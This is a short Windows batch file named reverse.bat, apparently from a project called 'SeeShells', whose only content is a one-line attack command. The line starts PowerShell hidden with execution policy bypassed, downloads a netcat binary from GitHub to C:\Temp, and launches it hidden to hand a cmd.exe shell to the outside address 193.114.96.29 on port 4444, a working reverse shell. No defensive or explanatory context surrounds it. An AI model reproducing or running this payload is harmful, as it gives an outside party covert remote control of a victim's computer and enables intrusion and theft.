#*******************************************************
#*  Project Name  : SeeShells
#*  File Name     : reverse.bat
#*  Author        : Damien Keffyn
#*  Company       : Sentinal IT
#*  Date Created  : 27/09/2024
#*******************************************************/

powershell -w hidden -NoP -NonI -Exec Bypass -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/int0x33/nc.exe/raw/master/nc.exe','C:\Temp\nc.exe');Start-Process 'C:\Temp\nc.exe' -ArgumentList '193.114.96.29 4444 -e cmd.exe' -WindowStyle Hidden"
